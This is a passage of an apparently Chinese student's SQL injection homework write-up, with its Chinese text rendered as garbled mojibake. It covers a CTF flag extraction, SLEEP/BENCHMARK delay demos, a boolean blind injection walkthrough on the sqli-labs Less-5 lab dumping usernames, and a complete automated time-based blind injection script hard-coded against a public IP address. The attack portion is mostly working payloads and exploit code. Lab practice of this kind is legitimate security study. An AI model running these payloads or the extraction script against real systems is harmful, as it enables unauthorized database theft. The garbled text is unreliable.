            print(f"ç¬¬{row_index+1}è¡Œ{column_name}ç¬¬{pos}ä¸ªå­—ç¬¦æšä¸¾å¤±è´¥")
            break
    
    return field_value

def main():
    print("å¼€å§‹è‡ªåŠ¨åŒ–æšä¸¾secretsè¡¨å†…å®¹...")
    
    # è·å–è¡Œæ•°
    row_count = get_row_count()
    if row_count == 0:
        print("secretsè¡¨ä¸ºç©º")
        return
    
    # æšä¸¾æ¯è¡Œçš„æ•°æ®
    columns = ["id", "secret_key", "description"]
    
    for row in range(row_count):
        print(f"\n=== ç¬¬{row+1}è¡Œæ•°æ® ===")
        row_data = {}
        
        for col in columns:
            value = get_field_value(row, col, row)
            row_data[col] = value
            print(f"{col}: {value}")
        
        print(f"å®Œæ•´ç¬¬{row+1}è¡Œ: {row_data}")
    
    print(f"\n=== secretsè¡¨å®Œæ•´å†…å®¹ ===")
    for row in range(row_count):
        print(f"ç¬¬{row+1}è¡Œ:")
        for col in columns:
            value = get_field_value(row, col, row)
            print(f"  {col}: {value}")

if __name__ == "__main__":
    main()
```



![image-20250904072409974](images/image-20250904072409974.png)

```
{'id': '1', 'secret_key': 'flag{Th1s_1s_A_H1dZ3n_SQLiL!}', 'description': ''}
```

å‘µå‘µï¼Œæ‰¾åˆ°äº†flagï¼Œç®—ä¸ç®—å®Œæˆå‘¢   07ç‚¹24åˆ†



# æ•°æ®åº“ç»“æ„æ€»ç»“

- **æ•°æ®åº“**
   `webapp_db`

- **è¡¨ç»“æ„**

  1. **products**

     - `id`
     - `name`
     - `description`
     - `price`

     ä¸é‡è¦ï¼Œå°±æ˜¯äº§å“ä¿¡æ¯

  2. **secrets**

     - `id`
     - `secret_key`
     - `description`

  3. **zhu_laoshi_tianrongxinkebiao**

     - ï¼ˆæšä¸¾å¤±è´¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼‰

- **æ•°æ®å†…å®¹**

  - åœ¨ `secrets` è¡¨é‡Œå‘ç°äº†ä¸€æ¡å…³é”®æ•°æ®ï¼š

    ```
    id: 1
    secret_key: flag{Th1s_1s_A_H1dZ3n_SQLiL!}
    description: ï¼ˆç©ºï¼‰
    ```









# ä½œä¸š2

------

## ğŸ”¹ å»¶è¿Ÿæ³¨å…¥æœ¬åœ°ç¤ºä¾‹

### 1. ç›´æ¥ `SLEEP()`

```sql
SELECT * FROM `users` WHERE id = 1 AND SLEEP(3);
```

ğŸ‘‰ æ•ˆæœï¼šæŸ¥è¯¢ç­‰å¾… 3 ç§’ã€‚

![image-20250903181429994](images/image-20250903181429994.png)

------

### 2. ç”¨ `CASE WHEN + SLEEP`

```sql
SELECT * FROM `users` 
WHERE id = 1 
  AND (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END);
```

ğŸ‘‰ æ•ˆæœï¼šæ¡ä»¶ä¸ºçœŸæ—¶å»¶è¿Ÿ 5 ç§’ã€‚

![image-20250903181922602](images/image-20250903181922602.png)

------

### 3. ç”¨ `ç®—æœ¯è¿ç®— + SLEEP`

```sql
SELECT * FROM `users` 
WHERE id = 1 
  AND SLEEP((1=1)*3);
```

ğŸ‘‰ æ•ˆæœï¼šå¸ƒå°”å€¼ä¹˜ä»¥ 3 â†’ ç­‰äº 3 â†’ å»¶è¿Ÿ 3 ç§’ã€‚

![image-20250903182315125](images/image-20250903182315125.png)

------

### 4. ç”¨ `BENCHMARK()` æ›¿ä»£ `SLEEP`

```sql
SELECT * FROM `users` 
WHERE id = 1 
  AND BENCHMARK(10000000, MD5('test'));
```

ğŸ‘‰ æ•ˆæœï¼šæ‰§è¡Œå¤§é‡ MD5 â†’ æŸ¥è¯¢æ˜æ˜¾å˜æ…¢ã€‚

![image-20250903182454937](images/image-20250903182454937.png)

------

### 5. `CASE WHEN + BENCHMARK`

```sql
SELECT * FROM `users`
WHERE id = 1
  AND (CASE WHEN (SUBSTRING(user(),1,1)='t') 
            THEN BENCHMARK(10000000,MD5('A')) 
            ELSE 1 END);
```

ğŸ‘‰ æ•ˆæœï¼šå¦‚æœæ•°æ®åº“ç”¨æˆ·åä»¥ `t å¼€å¤´ â†’ å»¶è¿Ÿï¼›å¦åˆ™æ­£å¸¸è¿”å›ã€‚

![image-20250903183853600](images/image-20250903183853600.png)

------

### 6. åˆ©ç”¨æ¡ä»¶å·®å¼‚åˆ¶é€ æ—¶é—´å·®

```sql
SELECT * FROM `users`
WHERE id = 1
  AND (CASE WHEN (ASCII(SUBSTRING(database(),1,1)) = ASCII('s')) 
            THEN SLEEP(5) ELSE 1 END);
```

ğŸ‘‰ æ•ˆæœï¼šå¦‚æœå½“å‰æ•°æ®åº“é¦–å­—æ¯ ASCII = sçš„asciiç  â†’ å»¶è¿Ÿ 5 ç§’ï¼Œå¦åˆ™ç«‹å³è¿”å›ã€‚

![image-20250903184250084](images/image-20250903184250084.png)

------





# å®é™…é¶åœº ä»¥case5ä¸ºä¾‹

# less-5 å¸ƒå°”ç›²æ³¨

# ğŸ” ç¬¬ä¸€æ­¥ï¼šç¡®è®¤æ³¨å…¥ç‚¹

```
?id=1-14  ä¸€ç›´æ˜¾ç¤ºçš„éƒ½æ˜¯you are in .....
?id=15           å½“idç­‰äº15çš„æ—¶å€™ï¼Œé¡µé¢æ˜¾ç¤ºä¸ºç©º
å¤§æ¦‚å¯ä»¥çŒœæµ‹å‡ºå¦‚æœä¸ºçœŸå°±æ˜¾ç¤ºï¼Œä¸ºå¦å°±ä¸æ˜¾ç¤ºï¼Œæ˜¯æ ‡å‡†çš„ç›²æ³¨
ä¹Ÿèƒ½çŸ¥é“æ­¤è¡¨æœ‰14ä¸ªè®°å½•

?id=1'             åŠ ä¸Š' åæŠ¥é”™ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ç‚¹
å°è¯•æ˜¯å¦ä¸ºæ•°å­—å‹
?id=1 and 1=1
?id=1 and 1=2      é¡µé¢æ²¡æœ‰åŒºåˆ«å‡ºçœŸå‡æ³¨å…¥ç‚¹
å°è¯•å­—ç¬¦å‹
?id=1â€™ and 1=1 --+
```

#### ?id=1' and 1=2 --+  æœ‰åŒºåˆ«å‡ºå‡æ³¨å…¥ç‚¹ï¼Œæ²¡æœ‰äº†å›æ˜¾ï¼Œless5æ˜¯**å¸ƒå°”å‹ç›²æ³¨**ã€‚

#### å¹¶ä¸”å¯ä»¥åˆ©ç”¨ çœŸorå¦ æ¥ç›²æ³¨

![image-20250903161305249](images/image-20250903161305249.png)



------

## ğŸ” ç¬¬äºŒæ­¥ï¼šç¡®è®¤å½“å‰æ•°æ®åº“å

å…ˆçŒœæ•°æ®åº“åé•¿åº¦ï¼Œç”¨burpçˆ†ç ´

```
?id=1' and length(database())=1 --+
```

![image-20250903185049953](images/image-20250903185049953.png)

#### å½“æ•°å€¼ä¸º8çš„æ—¶å€™æœ‰å›æ˜¾ï¼Œå¯ä»¥åˆ¤æ–­æ•°æ®åº“é•¿åº¦ä¸º8ä½

![image-20250903185312349](images/image-20250903185312349.png)



å†é€å­—ç¬¦çŒœï¼š

```
?id=1' and ascii(substr(database(),1,1))=1 --+
```

![image-20250903190104552](images/image-20250903190104552.png)

#### ç­›é€‰æˆåŠŸå…³é”®è¯ you are inï¼Œå¯¹payload1è¿›è¡Œæ’åº

![image-20250903190258495](images/image-20250903190258495.png)

```
å¯ä»¥å¾—çŸ¥åˆ†åˆ«å¾—çŸ¥æ¯ä¸€ä½çš„ç ï¼Œè§£æå¾—çŸ¥æ˜¯115 101 99 117 114 105  126 121  
```

#### å¯¹ç…§asciiè¡¨å¾—çŸ¥æ•°æ®åº“çš„åç§°ä¸º security

------

## ğŸ” ç¬¬ä¸‰æ­¥ï¼šæšä¸¾è¡¨å

æ‹¿ `information_schema.tables`ï¼š

```
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5 --+
```

![image-20250904015436610](images/image-20250904015436610.png)

### é•¿åº¦æ˜¯6

å†çŒœå­—ç¬¦ï¼š

```
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117 --+
```

![image-20250904015649980](images/image-20250904015649980.png)

![image-20250904015753669](images/image-20250904015753669.png)

```
æ‹¼æ¥ä¸€ä¸‹å°±æ˜¯ emailsï¼Œåç»­è¡¨ä¸åšæ¼”ç¤º
```

![image-20250904020122773](images/image-20250904020122773.png)

------

## ğŸ” ç¬¬å››æ­¥ï¼šæšä¸¾åˆ—å

##### ä¸Šå¸è§†è§’ä»¥ `users`   ä¸¾ä¾‹

```
?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=8 --+
```

![image-20250904020329376](images/image-20250904020329376.png)

åˆ—åé•¿åº¦2ã€‚

å†çŒœå­—ç¬¦ï¼š

```
?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117 --+
```

![image-20250904021255176](images/image-20250904021255176.png)

![image-20250904021632235](images/image-20250904021632235.png)

#### å¯¼å‡ºè®©chatgptæ‹¼æ¥

![image-20250904021618490](images/image-20250904021618490.png)



------

## ğŸ” ç¬¬äº”æ­¥ï¼šè·å–æ•°æ®

æ¯”å¦‚ç¬¬ä¸€æ¡ç”¨æˆ·ï¼š

```
?id=1' and length((select username from users limit 0,1))=5 --+    ä¸éœ€è¦
?id=1' and ascii(substr((select username from users limit 0,1),1,1))=68 --+   ç›´æ¥ä¸‰ä¸ªä¸€èµ·çˆ†
```

![image-20250904022146160](images/image-20250904022146160.png)

ç›´æ¥æŠŠç”¨æˆ·åä¸€èµ·çˆ†å‡ºæ¥

![image-20250904022545278](images/image-20250904022545278.png)

aiå¤„ç†ä¸€ä¸‹

![image-20250904022608201](images/image-20250904022608201.png)

```
Dumb
Angelina
Dumm
secure
stupid
superman
batman
admin
admin1
admin2
admin3
dhakkan
admin4
ä¸æ•°æ®åº“ç›¸ç¬¦ï¼Œç»“æŸ
```

![image-20250904022657913](images/image-20250904022657913.png)

#### ç°åœ¨æ˜¯02ç‚¹28åˆ†ï¼Œå¤ªæ™šäº†   æ—¶é—´ï¼ˆifï¼Œcase whenï¼‰ç›²æ³¨å°±è®©aiå†™ä¸ªå¤§æ¦‚æ€è·¯





# â³ æ—¶é—´ç›²æ³¨ï¼ˆif / case whenï¼‰

## 1ï¸âƒ£ åŸºæœ¬æ€è·¯

- å¸ƒå°”ç›²æ³¨æ˜¯é€šè¿‡é¡µé¢æ˜¯å¦æœ‰å†…å®¹å˜åŒ–æ¥åˆ¤æ–­æ¡ä»¶çœŸå‡
- æ—¶é—´ç›²æ³¨æ˜¯é€šè¿‡ **é¡µé¢å“åº”æ—¶é—´** æ¥åˆ¤æ–­æ¡ä»¶çœŸå‡

> é€‚ç”¨åœºæ™¯ï¼šé¡µé¢æ— æ˜æ˜¾å›æ˜¾ã€ä½†èƒ½æ‰§è¡Œè€—æ—¶å‡½æ•°ï¼ˆå¦‚ `sleep()`ï¼‰

å¸¸ç”¨å‡½æ•°ï¼š

```sql
sleep(3)            # MySQLå»¶è¿Ÿ3ç§’
benchmark(5000000,md5(1))  # è®¡ç®—å¯†é›†å‹å»¶è¿Ÿ
```

------

## 2ï¸âƒ£ ç¡®è®¤æ³¨å…¥ç‚¹

å’Œå¸ƒå°”ç›²æ³¨ä¸€æ ·ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦èƒ½è§¦å‘å»¶è¿Ÿï¼š

```sql
?id=1' and if(1=1, sleep(3), 1) --+   # é¡µé¢å»¶è¿Ÿ3ç§’ï¼Œè¯´æ˜æ³¨å…¥ç‚¹æˆç«‹
?id=1' and if(1=2, sleep(3), 1) --+   # é¡µé¢ç§’å›ï¼Œè¯´æ˜æ¡ä»¶ä¸ºå‡
```

è¿™æ ·ç¡®è®¤æ˜¯ **æ—¶é—´å‹ç›²æ³¨ç‚¹**ã€‚

------

## 3ï¸âƒ£ çˆ†æ•°æ®åº“åé•¿åº¦

```sql
?id=1' and if(length(database())=8, sleep(3), 1) --+
```

- å¦‚æœå»¶è¿Ÿï¼Œè¯´æ˜é•¿åº¦=8
- å¦‚æœä¸å»¶è¿Ÿï¼Œç»§ç»­æ¢æ•°å€¼

------

## 4ï¸âƒ£ çˆ†æ•°æ®åº“åé€å­—ç¬¦

```sql
?id=1' and if(ascii(substr(database(),1,1))=115, sleep(3), 1) --+
```

è§£é‡Šï¼š

- `substr(database(),1,1)` â†’ æ•°æ®åº“åç¬¬ 1 ä¸ªå­—ç¬¦
- `ascii()` è½¬æˆ ASCII ç 
- ç­‰äº 115 æ—¶è§¦å‘å»¶è¿Ÿ

**ä¼˜åŒ–**ï¼šç»“åˆäºŒåˆ†æ³•

```sql
?id=1' and if(ascii(substr(database(),1,1))>110, sleep(3), 1) --+
```

- æ ¹æ®å“åº”å¿«æ…¢æ¥åˆ¤æ–­èŒƒå›´ï¼Œæ•ˆç‡æ¯”ä¸€ä¸ªä¸ªçŒœé«˜å¾ˆå¤šã€‚

------

## 5ï¸âƒ£ æšä¸¾è¡¨å / åˆ—å

### è¡¨å

```sql
?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(3), 1) --+
```

### åˆ—å

```sql
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117, sleep(3), 1) --+
```

------

## 6ï¸âƒ£ è·å–æ•°æ®

æ¯”å¦‚è·å–ç¬¬ä¸€ä¸ªç”¨æˆ·çš„ç”¨æˆ·åï¼š

```sql
?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68, sleep(3), 1) --+
```

ä¾æ¬¡çˆ†ç ´ï¼Œå¾—åˆ°å®Œæ•´å­—æ®µå†…å®¹ã€‚

------

## 7ï¸âƒ£ æ€»ç»“æµç¨‹

1. **ç¡®è®¤æ³¨å…¥ç‚¹**ï¼š`and if(1=1,sleep(3),1)--+`
2. **ç¡®è®¤æ•°æ®åº“åé•¿åº¦**ï¼š`length(database())`
3. **çˆ†æ•°æ®åº“åé€å­—ç¬¦**ï¼š`substr()+ascii()+if()+sleep()`
4. **æšä¸¾è¡¨å**ï¼š`information_schema.tables`
5. **æšä¸¾åˆ—å**ï¼š`information_schema.columns`
6. **è·å–æ•°æ®**ï¼š`select username from users limit x,1`
7. **ä¼˜åŒ–æŠ€å·§**ï¼šç”¨äºŒåˆ†æ³•çˆ† ASCII æé€Ÿ

#### ä¸€é”®çˆ†ç ´è„šæœ¬

```
import requests
import time
import statistics

# ================= é…ç½®åŒº =================
URL = "http://47.242.11.182:88/Less-5/"
PARAM = "id"
SLEEP = 3              # æ¯æ¬¡ sleep çš„ç§’æ•°
MAXLEN = 30            # æœ€å¤§é•¿åº¦ï¼Œæ•°æ®åº“/è¡¨/åˆ—/æ•°æ®éƒ½é™åˆ¶
CHARS = list(range(32, 127))   # å¯æ‰“å°ascii
REPEAT = 3             # æ¯æ¬¡æ¢æµ‹é‡å¤æ¬¡æ•°
TIMEOUT = SLEEP + 5    # è¶…æ—¶æ—¶é—´

# ================= å·¥å…·å‡½æ•° =================
def send_payload(payload: str) -> float:
    params = {PARAM: "1" + payload}
    start = time.time()
    try:
        r = requests.get(URL, params=params, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return SLEEP + 1
    return time.time() - start

def is_true(condition: str) -> bool:
    """
    åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸï¼Œå¤šæ¬¡é‡‡æ ·ï¼Œå–å¤šæ•°æŠ•ç¥¨
    """
    payload = f"' and if({condition}, sleep({SLEEP}), 0)--+"
    times = [send_payload(payload) for _ in range(REPEAT)]
    votes = sum(1 for t in times if t > SLEEP / 2)
    return votes > REPEAT // 2

# ================= æ ¸å¿ƒå‡½æ•° =================
def get_length(expr: str, max_len: int = MAXLEN) -> int:
    for L in range(1, max_len+1):
        if is_true(f"length({expr})={L}"):
            print(f"[len] {expr} é•¿åº¦ = {L}")
            return L
    return 0

def get_string(expr: str, max_len: int = MAXLEN) -> str:
    length = get_length(expr, max_len)
    result = ""
    for pos in range(1, length+1):
        low, high = min(CHARS), max(CHARS)
        while low <= high:
            mid = (low + high) // 2
            if is_true(f"ascii(substr({expr},{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(high)
        print(f"[âœ“] pos {pos}: {chr(high)}  -> {result}")
    return result

def get_database():
    return get_string("database()")

def get_tables(dbname: str, limit: int = 10):
    tables = []
    for i in range(limit):
        expr = f"(select table_name from information_schema.tables where table_schema='{dbname}' limit {i},1)"
        name = get_string(expr)
        if not name:
            break
        tables.append(name)
    return tables

def get_columns(tablename: str, limit: int = 10):
    cols = []
    for i in range(limit):
        expr = f"(select column_name from information_schema.columns where table_name='{tablename}' limit {i},1)"
        name = get_string(expr)
        if not name:
            break
        cols.append(name)
    return cols

def get_data(tablename: str, colname: str, limit: int = 5):
    rows = []
    for i in range(limit):
        expr = f"(select {colname} from {tablename} limit {i},1)"
        value = get_string(expr)
        if not value:
            break
        rows.append(value)
    return rows

# ================= ä¸»ç¨‹åº =================
if __name__ == "__main__":
    print("[*] Step1: çˆ†å½“å‰æ•°æ®åº“å")
    db = get_database()
    print(f"[OK] å½“å‰æ•°æ®åº“: {db}")

    print("\n[*] Step2: çˆ†è¡¨å")
    tables = get_tables(db)
    print(f"[OK] è¡¨: {tables}")

    for t in tables:
        print(f"\n[*] Step3: çˆ†åˆ—å in {t}")
        cols = get_columns(t)
        print(f"[OK] {t} çš„åˆ—: {cols}")

        for c in cols:
            print(f"\n[*] Step4: çˆ†æ•°æ® {t}.{c}")
            rows = get_data(t, c)
            print(f"[OK] {t}.{c} æ•°æ®: {rows}")

```

